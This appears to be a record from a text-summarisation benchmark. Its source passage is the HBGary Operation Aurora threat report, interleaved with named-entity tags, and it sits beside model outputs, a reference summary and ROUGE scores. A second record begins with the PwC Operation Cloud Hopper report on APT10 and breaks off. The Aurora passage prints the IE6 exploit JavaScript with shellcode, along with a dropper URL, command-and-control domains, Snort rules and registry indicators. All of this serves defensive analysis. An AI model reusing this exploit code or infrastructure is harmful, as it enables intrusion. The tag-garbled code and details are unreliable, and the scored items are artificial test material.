has any direct involvement with [PERSON] Aurora . TOOLMARKDESCRIPTIONEmbedded [PERSON] Resource [PERSON] Language CodeUnited [DATE] StatesCRC Algorithm Table of [ORG] ConstantsEmbedded systems/ [NORP] Chinese publicationiiiDNS registration [PERSON] servicesPeng [PERSON] Yong , othersDETECTThis section of the report details how you can detectOperation [PERSON] Aurora in your Enterprise . The exploit and payload vehicle consists of the following components : \u2022 [ORG] JavaScript based exploit vector , known to exploit IE [CARDINAL] 6 \u2022 Shellcode component , embedded in the JavaScript \u2022 Secondary payload server that delivers a dropper \u2022 The dropper itself , which only used once and then deleted \u2022 The backdoor program which is decompressed fromthe dropperFebruary [DATE] 10 , [DATE] 2010 3JAVASCRIPT AND SHELLCODEThe JavaScript based attack vector associated withOperation [PERSON] Aurora was published in the public domain in [DATE] early [DATE] January [DATE] 2010 . [ORG] Microsoft details the vulnerability in Security Bulletin MS10 - 002 . Internet Explorer 5.01 , Internet Explorer 6 , Internet Explorer 6 Service Pack [CARDINAL] 1 , Internet Explorer 7 , and Internet Explorer 8 ( except Internet Explorer 6 for supported editions of [ORG] Windows [ORG] Server [ORG] 2003 ) are affected . Exploit code analyzed by HBGary reveals that only Internet Explorer 6 was targeted during Operation [PERSON] Aurora . This vulnerability can be leveraged by attackers of varying skill levels due to theJAVASCRIPT EXPLOIT CODE var sc = unescape(\u201c%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8 db%u87d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u 8caa%u9e53%u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE [PERCENT] 8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342 [PERCENT] % ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8\u201d);var sss = [ORG] Array ( [CARDINAL] 826 , [CARDINAL] 679 , [CARDINAL] 798 , [CARDINAL] 224 , [CARDINAL] 770 , [CARDINAL] 427 , [CARDINAL] 819 , [CARDINAL] 770 , [CARDINAL] 707 , [CARDINAL] 805 , [CARDINAL] 693 , [CARDINAL] 679 , [CARDINAL] 784 , [CARDINAL] 707 , [CARDINAL] 280 , [CARDINAL] 238 , [CARDINAL] 259 , [CARDINAL] 819 , [CARDINAL] 336 , [CARDINAL] 693 , [CARDINAL] 336 , [CARDINAL] 700 , [CARDINAL] 259 , [CARDINAL] 819 , [CARDINAL] 336 , [CARDINAL] 693 , [CARDINAL] 336 , [CARDINAL] 700 , [CARDINAL] 238 , [CARDINAL] 287 , [CARDINAL] 413 , [CARDINAL] 224 , [CARDINAL] 833 , SECTION REMOVED FOR SPACE [CARDINAL] 735 , [CARDINAL] 427 , [CARDINAL] 336 , [CARDINAL] 413 , [CARDINAL] 735 , [CARDINAL] 420 , [CARDINAL] 350 , [CARDINAL] 336 , [CARDINAL] 336 , [CARDINAL] 413 , [CARDINAL] 735 , [CARDINAL] 301 , [CARDINAL] 301 , [CARDINAL] 287 , [CARDINAL] 224 , [CARDINAL] 861 , [CARDINAL] 840 , [CARDINAL] 637 , [CARDINAL] 735 , [CARDINAL] 651 , [CARDINAL] 427 , [CARDINAL] 770 , [CARDINAL] 301 , [CARDINAL] 805 , [CARDINAL] 693 , [CARDINAL] 413 , [CARDINAL] 875);var arr = new [ORG] Array ; for ( var i = [CARDINAL] 0 ; i < sss.length ; i + + ) { } arr[i ] = String.fromCharCode ( sss [ i ] / 7);var cc = arr.toString ( ) ; cc = cc.replace ( /,/g , \u201c \u201d ) ; cc = [PERSON] cc.replace ( /@/g , \u201c , \u201d ) ; eval ( cc);var x1 = new [ORG] Array ( ) ; for ( i = [CARDINAL] 0 ; i < [CARDINAL] 200 ; i + + ) { } ; x1 [ i ] = document.createElement ( \u201c COMMENT \u201d ) ; x1 [ i].data = \u201c abc\u201d;var e1 = null;function ev1 ( evt ) } e1 = document.createEventObject ( evt ) ; document.getElementById ( \u201c sp1\u201d).innerHTML = \u201c \u201d ; window.setInterval ( ev2 , 50);\u201c\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u 0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0 d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\u201d;x1 [ i].data = p;p = for ( i = [CARDINAL] 0 ; i < x1.length ; i + + ) { var t = e1.srcElement;function ev2 ( ) < span [ORG] id=\u201dsp1\u201d><IMG SRC=\u201daaa.gif \u201d onload=\u201dev1(event ) \u201d width=\u201d16 \u201d height=\u201d16\u201d></span > < /body > < /html>4 HB GARY THREAT REPORT : OPERATION AURORApublic availability of the [GPE] Metasploit module \u201c ie_aurora.rb \u201d . The exploit code used by the original attackers was quickly improved and added to [GPE] Metasploit thus greatly expanding the potential number of attackers and reliability of code . The JavaScript performs a heap spray attack and injectsthe embedded shellcode described below . The JavaScript exploits the vulnerability in Internet Explorer by copying , releasing , and then referencing [ORG] a [ORG] Document [ORG] Object [ORG] Model ( DOM ) element . [ORG] JAVASCRIPT ARTIFACTSPATTERNInitial encrypted dropper download . Deleted fi le . C:\\%appdata%\\a.exeDecrypted dropper . Deleted fi le . C:\\%appdata\\b.exeJavaScript present in Internet Explorer memory space.<code listed above > Download URL present in internet history during memory analysis.url demo / ad.jpgOther domains associated with Aurora.sl1.homelinux.org [CARDINAL] 360.homeunix.com ftp2.homeunix.com update.ourhobby.com blog1.servebeer.comThe shellcode exists as a [GPE] Unicode escaped variable ( sc ) in the malicious [ORG] JavaScript listed below . Upon successful exploitation of Internet Explorer , the shellcode will download an obfuscated [ORDINAL] second stage executable from url ftpaccess.cc/demo/ad.jpg which is the dropper . Note : these fi les are specifi c to the sample we analyzed at HBGary , Inc. The attackers must use a [ORDINAL] second stage download mechanism to achieve full system access due to memory constraints . It is unlikely that the fi nal payload could be delivered through the original exploit given these conditions . The dropper is [PERSON] XOR encrypted with a [DATE] 0x95 key . The shellcode copies this encrypted binary to the user \u2019s [PRODUCT] AppData directory as \u201c a.exe \u201d . The shellcode then decrypts \u201c a.exe \u201d and moves it to \u201c b.exe \u201d in the same directory . Then \u201c b.exe \u201d is executed . The following actionable intelligence can be used to identify exploit remnants in the heap space of Internet [ORG] Explorer post exploitation attempt . These patterns can be searched for when doing memory analysis of a victim system . SHELLCODE ARTIFACTSPATTERNSelf - decrypting code using a constant [PERSON] XOR [PERSON] value.80 [CARDINAL] 34 [ORG] 0B D8 [CARDINAL] 80 [CARDINAL] 34 0B D8Kernel32.dll searching code.64 A1 30 00 00 00 [ORG] 8B 40 0C 8B [CARDINAL] 70 [CARDINAL] 1CPush Urlmon string to stack using [CARDINAL] two push statements.68 [CARDINAL] 6F 6E 00 00 68 75 72 6C 6DThe following [ORG] SNORT rules have been released by the Emerging Threats project to detected the fi nal payload command and control communications . Network Detection Signaturesalert tcp $ HOME_NET any - > $ EXTERNAL_NET 443 ( msg:\u201dET [ORG] TROJAN [PERSON] Aurora [PERSON] Backdoor ( [ORG] C&C ) client connection to CnC \u201d ; fl ow : established , to _ server ; content:\u201d|ff ff ff ff ff ff [CARDINAL] 00 [CARDINAL] 00 fe ff ff ff ff ff ff ff ff ff [CARDINAL] 88 ff| \u201d ; depth:20 ; fl owbits : set , ET.aurora.init ; classtype : trojan - activity ; reference : url , www.trustedsource.org / blog/373 / An - Insight - into - the- [ORG] Aurora - Communication - Protocol ; reference : url , [PERSON] doc.emergingthreats . net/2010695 ; reference : url , www.emergingthreats.net / cgi - bin / cvsweb . cgi / sigs / VIRUS [ORG] / TROJAN_Aurora ; sid:2010695 ; rev:2;)alert tcp $ EXTERNAL_NET 443 - > $ HOME_NET any ( msg:\u201dET [ORG] TROJAN [PERSON] Aurora [PERSON] Backdoor ( [ORG] C&C ) connection CnC response \u201d ; fl owbits : isset , ET . aurora.init ; fl ow : established , from_server ; content:\u201d|cc cc cc cc cd cc cc cc cd cc cc cc cc cc cc cc| \u201d ; depth:16 ; classtype : trojan - activity ; reference : url , www.trustedsource.org / blog/373 / An - Insight - into - the- [ORG] Aurora - Communication - Protocol ; reference : url , [PERSON] doc.emergingthreats . [PERSON] net/2010696 ; reference : url , www.emergingthreats.net / cgi - bin / cvsweb . cgi / sigs / VIRUS [ORG] / TROJAN_Aurora ; sid:2010696 ; rev:2;)DROPPERThe initial dropper is merely a detonation package thatdecompresses an embedded [ORG] DLL into the [PRODUCT] Windows system32 directory and loads it as a service . The initial dropper is likely to be packed ( UPX , etc ) . The dropper has an embedded [ORG] DLL that is decompressed to the windows system32 directory . This [ORG] DLL will be named to resemble existing services ( rasmon . dll , etc ) . In order to evade forensics , the fi le - time of the dropped [ORG] DLL will be modifi ed to match that of an existing system [ORG] DLL ( user32.dll , etc ) . The dropped [ORG] DLL is loaded into its own svchost.exe process . Several registry keys are created and then deleted as part of this process . Finally , the dropper deletes itself from the system by using a dissolving batch fi le ( DFS.BAT , etc).ACTIONABLE [ORG] INTELLIGENCEPATTERNService [ORG] Key [ORG] & [ORG] Value [ORG] Note : deleted after dropPath to backdoor Note : deleted after stage 1Path to backdoor Note : persistentSOFTWARE\\Microsoft\\Windows NT\\ Data : [PERSON] Ups ? ? ? ( ? ? ? are [CARDINAL] three random chars)SYSTEM\\CurrentControlSet\\Services\\ Data : ( full path to the backdoor)SYSTEM\\CurrentControlSet\\Services\\ Data : ( full path to [DATE] the [DATE] backdoor)February [DATE] 10 , 2010 5ACTIONABLE INTELLIGENCEPATTERNSYSTEM\\CurrentControlSet\\Services\\ Data : % temp%\\c_####.nls ( where # # # # is a number)SYSTEM\\CurrentControlSet\\Services\\ Data : % temp%\\c_1758.nlsPotential variationPotential variationPAYLOADThe payload usesGLANCE UNDER THE HOOD buffer after phase one XOR : mJ2bhcPExs7excLThcjExqurnauYq buffer after base64 decoding : \u00c3\u00c4\u00c6\u00ce\u00de\u00c5\u00c2\u00d3 \u2026 [ORG] \u00c8\u00c4\u00c6 \u00ab \u00ab \u00ab \u02dc\u00ab\u0178\u00ab\u201c\u00ab\u2020\u00ab\u0161\u00ab\u0161\u00ab\u017e\u00ab\u0161\u00ab\u0153two - stage installation . During stage one , the dropper will install the payload as a service running under the name [PERSON] Ups ? ? ? ( where ? ? ? are [CARDINAL] three random characters ) . Once executing , the payload will immediately delete the fi rst service and enter stage - two . During stage - two , the payload will register a new , [ORDINAL] second service under the name [PERSON] RaS ? ? ? ( where ? ? ? are [CARDINAL] three random characters ) . This new service will point to the same backdoor [ORG] DLL , no new fi les are involved . Note : the [CARDINAL] three character prefi xes [PERSON] Ups and [PERSON] RaS can easily be modifi ed by the attacker . Once the new service is registered , the payload will access an embedded resource that is encrypted . The decryption goes through several phases . The encrypted data block contains the [ORG] DNS name for the command and control server ( homeunix . com , etc ) . This data block is confi gurable before the malware is deployed . The data block length is hard - coded ( 0x150 or [CARDINAL] 336 bytes ) . During phase one , this data block is fed through a simple [WORK_OF_ART] XOR ( 0x99 ) , resulting in an [ORG] ASCII - string . Next , the resulting [ORG] ASCII - string is fed into a base64 decoding function , producing a binary string . Finally , the resulting base64 decoded binary string is fed through another XOR ( 0xAB ) , resulting in clear - text . The [CARDINAL] three primary encryption loops are colored and marked in Figure [CARDINAL] 1 . The resulting clear - text buffer contains several fi elds in both [ORG] ASCII and [ORG] UNICODE , including the [ORG] C&C server address . Figure [CARDINAL] 1 . Base64 and [ORG] XOR [ORG] Encryption [ORG] Scheme6 [ORG] HB [ORG] GARY [ORG] THREAT REPORT : OPERATION AURORAACTIONABLE INTELLIGENCEPATTERNC&C Server DNS * .homeunix.com ( where * is any subdomain ) * .fi loups.info * .blogsite.orgThe payload will create additional registry keys . ACTIONABLE INTELLIGENCEPATTERNAdditional [ORG] KeyAdditional KeyHKLM\\Software\\Sun\\1.1.2\\IsoTpHKLM\\Software\\Sun\\1.1.2\\AppleTlkOther potential dropped fi les , as reported by McAfee : ACTIONABLE INTELLIGENCEPATTERNAdditional FileAdditional FileAdditional FileAdditional FileAdditional FileAdditional FileAdditional FileAdditional FileAdditional FileAdditional Filesecurmon.dllAppMgmt.dllA0029670.dll ( A00#####.dll)msconfi g32.sysVedioDriver.dllacelpvc.dllwuauclt.exejucheck.exeAdobeUpdateManager.exezf32.dllCOMMAND AND CONTROLThe payload communicates with its command and controlserver over port [CARDINAL] 443 . The source port is randomly selected . While outbound traffi c appears to be [ORG] HTTPS , the actual traffi c uses a weak custom encryption scheme . The command and control packets have a very specifi c format.ivcommandparms0x00000001payload len [ORG] CRC [ORG] KEY payloadThe payload section is encrypted with a key selected byusing GetTickCount . This means each infected node has its own key . The key is embedded in the header of the packet , and is easily recovered . [ORG] DIAGNOSE HOW THE [ORG] MALWARE WORKSThe primary control logic can be found in the module registered under the service key ( rasmon.dll , etc . ) . This module has been written in c and includes several specifi c methods and encodings that provide forensic track - ability . The above screenshot illustrates a [ORG] REcon \u2122 trace on themalware dropper and subsequent service creation . [PERSON] Location [PERSON] A. represents the dropper program , which unpacks itself and decompresses a fi le to the system32 directory . [PERSON] Point [PERSON] B. represents the initial svchost.exe startup , which is loading the malware payload . [PERSON] Location [PERSON] C. is the actual execution of the malware service , which remains persistent . At points E. and F. you can see the malware checking in with the command and control server . Finally , location [NORP] D. represents the dissolvable batch fi le which deletes the initial dropper and then itself . CAPABILITYThe malware has generic and fl exible capabilities . There aredistinct command handlers in the malware that allow fi les to be stolen and remote commands to be executed . The command handler is illustrated in Figure [CARDINAL] 2 . At location A. the command number is checked . At locations marked [ORG] B. are each individual command handler , as controlled by the [ORG] C&C server and commandFebruary [DATE] 10 , [DATE] 2010 [CARDINAL] 7number in the [ORG] C&C packet . [PERSON] Location [PERSON] C. is where the result of each command is sent back to the [ORG] C&C server . Figure [CARDINAL] 2 . [ORG] C&C [ORG] Command ParserCOPYCATS AND [PERSON] VARIANTSWith the release of MS10 - 002 , and the subsequentintegration with [GPE] Metasploit , the exploit vector used with [PERSON] Aurora has been adopted laterally within the malware development economy . Therefore , the use of MS10 - 002 should not be construed as an [NORP] Aurora infection without further analysis of the dropped payload . Forensic toolmarks and link analysis have revealed several different threat groups who are employing common IE exploit vectors . HBGary is currently tracking several groups who operate malware systems of this nature . HBGary is using forensic toolmarks to trace the sourcecode origins of binary malware samples dropped in conjunction with the MS10 - 002 exploit vector . For example , in Figure [CARDINAL] 3 , link analysis is being used to track the identity of a threat actor in conjunction with his known [ORG] Digital DNA \u2122 . HBGary \u2019s [ORG] Digital DNA \u2122 database not only codifi es the behavior of software , but also the coding idioms , algorithms , and methods of individual developers . In this way , individual threat actors can be tracked with [ORG] Digital DNA \u2122 .In the example , link analysis is provided by [ORG] Palantir \u2122 . The screenshot illustrates only a subset of the data being tracked by HBGary , and sensitive information has been redacted . At location [CARDINAL] 1 . is a dropper obtained from an exploit server directly accessed from the extracted shellcode from a [PRODUCT] MS10- 002 [ORG] JavaScript vector . Location [CARDINAL] 2 . represents a forensic toolmark within the dropped executable . This toolmark was obtained using physical memory assessment of the live executable , after it was allowed to unpack itself in a virtual machine . This assessment was performed with HBGary Responder \u2122 . At location [CARDINAL] 3 . , the recovered toolmark(s ) were researched against published source code artifacts on the Internet . From this , a single posting was discovered with this exact toolmark , and this posting exists only in [CARDINAL] one place and is of [NORP] Chinese origin . From this , the author of the source code was determined to be XXXXXXXX . At location [CARDINAL] 4 . , all social cyberspaces used by [PERSON] XXXXXXX were then enumerated . From this , postings in [GPE] Traditional and Simplifi ed [NORP] Chinese were discovered that confi rm that [GPE] XXXXXX is the author and supplier of a malware package known as \u2018 NB \u2019 or \u2018 Netbot Attacker \u2019 . Within the social space around \u2018 Netbot Attacker \u2019 are individuals who are testing and/or asking for technical support regarding the malware package operation . These individuals have been grouped within [ORG] Palantir \u2122 as \u2018 technical support for bot \u2019 at location 5.Figure [CARDINAL] 3 . Link Analysis of [ORG] Malware [ORG] Actors using [ORG] Palantir \u2122 The above process , when carried further , produces many more social links . Attribution such as this allows resolution and visibility into the intent of individual threat [PERSON] groups.8 HB GARY THREAT REPORT : OPERATION AURORADIGITAL DNA INOCULATION SHOTHBGary has prepared an inoculation shot for this malware . The inoculation shot is a small , signed binary that will allow you to scan for , and optionally remove , this malware from your Enterprise network . The aurora innoculation shot can be downloaded from www.hbgary.com . When the aurora innoculation shot is executed it will querythe user for authentication credentials . Optionally the user can just hit \u201c cancel \u201d to use the currently logged on USER \u2019s authentication token . Some sample usages are listed below . To scan a single machine : AuroraInnoculation.exe -scan MYBOXNAMETo scan multiple machines : AuroraInnoculation.exe -list targets.txt MCAFEE EPO CUSTOMERS DETECTION OF AURORA THREATS WITH [ORG] DIGITAL DNA FOR EPOCustomers of [ORG] McAfee [ORG] ePolicy [ORG] Orchastrator , integratedwith [ORG] Digital DNA , can detect emerging advanced persistent threats . To detect [PERSON] Aurora , users should perform a [ORG] Digital DNA [ORG] Sequence search with the above mentioned sequence for [PERSON] Aurora , and set a fuzzy match of 90 [PERCENT] % or greater . Once machines are detected , the user is encouraged to use the freely available inoculation shot to remove the infection . RESPONDSeveral Enterprise products have the capability to scanfor and potentially remove the [PERSON] Aurora malware . Detection of the malware is covered in detail , from multiple aspects , in the [LOC] Detect section above . When using a [ORG] Digital DNA \u2122 capable platform such as [PERSON] McAfee [PERSON] ePO , you can search the Enterprise for the following [ORG] Digital DNA sequence ( recommend a tight match , 90 [PERCENT] % or higher).DIGITAL DNA SEQUENCE FOR AURORA MALWARE01 B4 EE 00 AE DA [CARDINAL] 00 8C [CARDINAL] 16 00 89 22 00 46 73 00 [CARDINAL] C6 49 00 0B AE 01 [PRODUCT] E7 [PRODUCT] 9F 04 05 81 01 0E [ORG] DF 01 79 D8 00 [CARDINAL] 25 6A 00 15 49 00 47 22 00 4B [CARDINAL] 67 [ORG] 0F [ORG] 2D [ORG] CC [DATE] 01 [DATE] 29 [DATE] 67 01 [CARDINAL] 35 [CARDINAL] 99To thwart command and control and prevent data loss , known [ORG] C&C domains should be blocked at the egress fi rewall . The domains listed in the [LOC] Detect section represent a signifi ca nt set of those currently known to be operating . IDS signatures similar to the one illustrated in the [LOC] Detect section should be used to detect inbound exploit attempts , and machines accepting this data should be scanned for potential infections . Many A / V products now contain signatures for the [PERSON] Aurora exploit and will be effective in detection and removal . However , the attackers that represent the threat will not be deterred , and variants of the attack are nearly assured . FACTORSC&C protocolInstallation and DeploymentDESCRIPTIONIf a variant is developed , it will very likely use the same [ORG] C&C protocol , but may change the header of the packet and the constants used for connection setup . This will evade [ORG] IDS [ORG] / [PERSON] Firewall rules designed to detect the current scheme . It is unlikely the attackers will change the encryption setup , however . The method used to install the service is highly effective . Although the fi lenames will likely change , the actual method will likely remain . INOCULATIONMORE INFORMATION ABOUT [GPE] HBGARY , INCHBGary , [ORG] Inc is the leading provider of solutions to detect , diagnose and respond to advance malware threats in a thorough and forensically sound manner . We provide the active intelligence that is critical to understanding the intent of the threat , the traits associated with the malware and information that will help make your existing investment in your security infrastructure more valuable . Web : www.hbgary.comCorporate Address : 3604 [EVENT] Fair [EVENT] Oaks [EVENT] Blvd [EVENT] Suite [CARDINAL] 250 [GPE] Sacramento , CA 95762 Phone : 916 - 459 - 4727 Fax 916 - 481 - 1460 Sales@hbgary.comREFERENCESi url url url url operation - aurora - clues - in - the - code/)iv url communication - protocol / v url OFFICE [CARDINAL] 3604 [EVENT] Fair [EVENT] Oaks [EVENT] Blvd . [GPE] Ste . [CARDINAL] 250 [GPE] Sacramento , CA 95864 [DATE] 916.459.4727 PhoneCONTACT INFORMATION info@hbgary.com support@hbgary.com www.hbgary.com", "generated_text": "Operation Aurora; a remote operated backdoor program; Windows; the backdoor; capabilities; CAD; oil exploration bid-data; KEY FINDING; the malware operation; Chinese; Chinese; domains; C&C control; the operators; domains; Dynamic DNS; the operation; Chinese-State; involvement; the Chinese government; the operation; intellectual property theft; IP addresses; the attacker; the malware; State.", "ref_text": "<START-1>Operation Aurora refers to cyberattacks targeting major companies like Google and Adobe to steal intellectual property. The attacks used a JavaScript exploit in IE 6 to install a backdoor Trojan on target systems. The malware has been under development since at least 2006 and is of Chinese origin based on forensic evidence like the CRC algorithm. The command and control infrastructure uses dynamic DNS provided by a Chinese service. The initial infection downloads an encrypted dropper which installs the payload as a Windows service. The payload connects to command servers using a custom encryption scheme on port 443. The malware is controlled by operators to execute commands like stealing files or running remote commands. The full capabilities are flexible based on command numbers sent by the command server. The attacks are attributed to threat actors in China based on malware analysis, though definitive proof of Chinese government involvement is lacking. The malware economy has adopted the IE exploit for other operations. Recommended response includes blocking known command and control domains, using antivirus signatures to detect malware, and HBGary's inoculation tool to scan for and remove infections across a network. The report summarizes the technical details, capabilities, attribution and recommended response for the Operation Aurora attacks that targeted major corporations to steal intellectual property. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.47567567567567565, "gpt3/lexical/rouge_rouge2": 0.10869565217391304, "gpt3/lexical/rouge_rougeL": 0.23243243243243245, "gpt3/lexical/rouge_rougeLsum": 0.23243243243243245, "gpt3_generated_text": ["The article provides an in-depth analysis of Operation Aurora, a sophisticated malware operation targeting intellectual property theft, including source code and technical diagrams such as CAD and oil exploration bid data. The operation has been associated with several prominent companies, and the malware package used is mature and has been in development since at least 2006. While there is speculation about Chinese state involvement, the evidence does not directly attribute the operation to the Chinese government. The operators of the malware utilize Chinese systems and native language malware, and the communication is encrypted over HTTP, port 443, obfuscated with a weak encryption scheme. The article also discusses the attribution, tools, and methods to detect Operation Aurora in an enterprise. It highlights the need for true threat intelligence to identify the individuals, country of origin, and intent of the attacker, as well as the significant risk posed by the operation to intellectual property in the enterprise."]}, {"split_name": "test", "sample_id": "test_44", "prompt_text": "Extract the keywords: www.pwc.co.uk/cyberOperation [PERSON] Cloud [PERSON] HopperExposing a systematic hacking operation with an unprecedented web of global victimsApril [CARDINAL] 2017In collaboration withContentsForewordExecutive [ORG] summaryAPT10 as a [GPE] China - based threat actorMotivations behind APT10 \u2019s targetingShining a light on APT10 \u2019s methodologyConclusionAppendices345141620212ForewordThis report is an initial public release of research [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have conducted into new , sustained global campaigns by an established threat actor against managed IT service providers and their clients as well as several directly targeted organisations in [GPE] Japan . Given the scale of those campaigns , the activity identified here is likely to reflect just a small portion of the threat actor \u2019s operations . This report is primarily fact - based . Where we have made an assessment this has been made clear by phraseology such as \u201c we assess \u201d , and the use of estimative language as outlined in [ORG] Appendix [ORG] A.By publicly releasing this research , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems hope to facilitate broad awareness of the attack techniques used so that prevention and detection capabilities can be configured accordingly . It is also hoped that rapid progress can be made within the broader security community to further develop the understanding of the campaign techniques we outline , leading to additional public reports from peers across the security community . As a part of our research and reporting effort , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have collaborated with the [GPE] UK \u2019s [ORG] National [ORG] Cyber [ORG] Security [ORG] Centre ( [ORG] NCSC ) under its [LAW] Certified [LAW] Incident [LAW] Response ( [ORG] CIR ) scheme to engage and notify managed IT service providers , known affected organisations and other national bodies . Supplementary to this report , an [ORG] Annex containing our technical analysis will be released.3Executive summarySince [DATE] late [DATE] 2016 , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have been assisting victims of a new cyber espionage campaign conducted by a [GPE] China - based threat actor . We assess this threat actor to almost certainly be the same as the threat actor widely known within the security community as \u2018 APT10 \u2019 . The campaign , which we refer to as Operation Cloud Hopper , has targeted managed IT service providers ( MSPs ) , allowing APT10 unprecedented potential access to the intellectual property and sensitive data of those MSPs and their clients globally . A number of [NORP] Japanese organisations have also been directly targeted in a separate , simultaneous campaign by the same actor . We have identified a number of key findings that are detailed below . APT10 has recently unleashed a sustained campaign against MSPs . The compromise of [ORG] MSP networks has provided broad and unprecedented access to [ORG] MSP customer networks.\u2022 Multiple MSPs were almost certainly being targeted [ORG] from2016 onwards , and it is likely that APT10 had already begun to do so from as early as [CARDINAL] 2014.\u2022 [ORG] MSP infrastructure has been used as part of a complex webof exfiltration routes spanning multiple victim networks . APT10 has significantly increased its scale and capability since [DATE] early [DATE] 2016 , including the addition of new custom tools.\u2022 APT10 ceased its use of the [ORG] Poison Ivy malware familyafter a [DATE] 2013 [ORG] FireEye report , which comprehensively detailed the malware \u2019s functionality and features , and its use by several [GPE] China - based threat actors , including [CARDINAL] APT10.\u2022 APT10 primarily used PlugX malware from [DATE] 2014 to 2016,progressively improving and deploying newer versions , while simultaneously standardising their command and control function.\u2022 We have observed a shift towards the use of bespokemalware as well as open - source tools , which have been customised to improve their functionality . This is highly likely to be indicative of an increase in sophistication . Infrastructure observed in APT10 \u2019s most recent campaigns links to previous activities undertaken by the threat actor.\u2022The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic - DNS domains , which are highly interconnected and link to the threat actor \u2019s previous operations . The number of dynamic - DNS domains in use by the threat actor has significantly increased since [DATE] 2016 , representative of an increase in operational tempo.\u2022Some top level domains used in the direct targeting of [NORP] Japanese entities share common [ORG] IP address space with the network of dynamic - DNS domains that we associate with Operation Cloud Hopper . APT10 focuses on espionage activity , targeting intellectual property and other sensitive data.\u2022 APT10 is known to have exfiltrated a high volume of datafrom multiple victims , exploiting compromised [ORG] MSP networks , and those of their customers , to stealthily move this data around the world.\u2022 The targeted nature of the exfiltration we have observed , along with the volume of the data , is reminiscent of the previous era of [ORG] APT campaigns pre-2013.PwC [GPE] UK and [ORG] BAE [ORG] Systems assess APT10 as highly likely to be a [GPE] China - based threat actor.\u2022It is a widely held view within the cyber security community that APT10 is a [GPE] China - based threat actor.\u2022 Our analysis of the compile times of malware binaries , the registration times of domains attributed to APT10 , and the majority of its intrusion activity indicates a pattern of work in line with [ORG] China [ORG] Standard [ORG] Time ( UTC+8).\u2022 The threat actor \u2019s targeting of diplomatic and politicalorganisations in response to geopolitical tensions , as well as the targeting of specific commercial enterprises , is closely aligned with strategic [NORP] Chinese interests.4APT10 as a [GPE] China - based threat actorAPT10 as a [GPE] China - based threat actor [PERSON] PwC [PERSON] UK and [ORG] BAE [ORG] Systems assess it is highly likely that APT10 is a [GPE] China - based threat actor with a focus on espionage and wide ranging information collection . It has been in operation since [DATE] at [DATE] least [DATE] 2009 , and has evolved its targeting from an early focus on the [GPE] US defence industrial base ( [ORG] DIB)1 and the technology and telecommunications sector , to a widespread compromise of multiple industries and sectors across the globe , most recently with a focus on MSPs . APT10 , a name originally coined by [ORG] FireEye , is also referred to as [ORG] Red [ORG] Apollo by [ORG] PwC UK , CVNX by [ORG] BAE [ORG] Systems , [NORP] Stone [NORP] Panda by [ORG] CrowdStrike , and menuPass Team more broadly in the public domain . The threat actor has previously been the subject of a range of open source reporting , including most notably a report by [ORG] FireEye comprehensively detailing the threat actor \u2019s use of the [ORG] Poison Ivy malware family2 and blog posts by [ORG] Trend Micro3 similarly detailing the use of [PRODUCT] EvilGrab malware . Alongside the research and ongoing tracking of APT10 by both PwC [GPE] UK and [ORG] BAE \u2019s [ORG] Threat [ORG] Intelligence teams , PwC UK \u2019s Incident [ORG] Response team has been engaged in supporting investigations linked to APT10 compromises . This research has contributed to the assessments and conclusions we have drawn regarding the recent campaign activity by APT10 , which represents a shift from previous activities linked to the threat actor . As a result of our analysis of [ORG] APT10 \u2019s activities , we believe that it almost certainly benefits from significant staffing and logistical resources , which have increased over [DATE] the [DATE] last [DATE] three [DATE] years , with a significant step - change in [DATE] 2016 . Due to the scale of the threat actor \u2019s operations throughout [DATE] 2016 and [DATE] 2017 , we similarly assess it currently comprises multiple teams , each responsible for a different section of the day - to - [DATE] day operations , namely domain registration , infrastructure management , malware development , target operations , and analysis . APT10 withdrew from direct targeting using [ORG] Poison Ivy in [DATE] 2013 and conducted its [ORDINAL] first known retooling operation , upgrading its capabilities and replatforming to use PlugX. It is highly likely that this is due to the release of the [DATE] 2013 [ORG] FireEye report . Our report will detail the most recent campaigns conducted by APT10 , including the sustained targeting of MSPs , which we have named [PERSON] Operation [PERSON] Cloud [PERSON] Hopper , and the targeting of a number of [NORP] Japanese institutions.1 The defence industrial base comprises [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense and a plethora of companies that support the design , development andmaintenance of defence assets and enable [GPE] US military requirements to be met . url url [CARDINAL] 3 url analysis of APT10 \u2019s operations As part of our analysis , we have made a number of observations about APT10 and its profile , which supports our assessment that APT10 is a [GPE] China - based threat actor . For example , we have identified patterns within the domain registrations and file compilation times associated with APT10 activity . This is almost certainly indicative of a threat actor based in the [GPE] UTC+8 time zone , which aligns to [ORG] Chinese [ORG] Standard [ORG] Time ( CST).Shown in Figure [CARDINAL] 1 are registration times4 , represented in [ORG] UTC , for known APT10 top level domains since [DATE] mid-2016 , which mark a major uptick in APT10 activity . Mapping this to [GPE] UTC+8 , as in Figure [CARDINAL] 2 , shows a standard set of [NORP] Chinese business hours , including a [TIME] two [TIME] - [TIME] hour 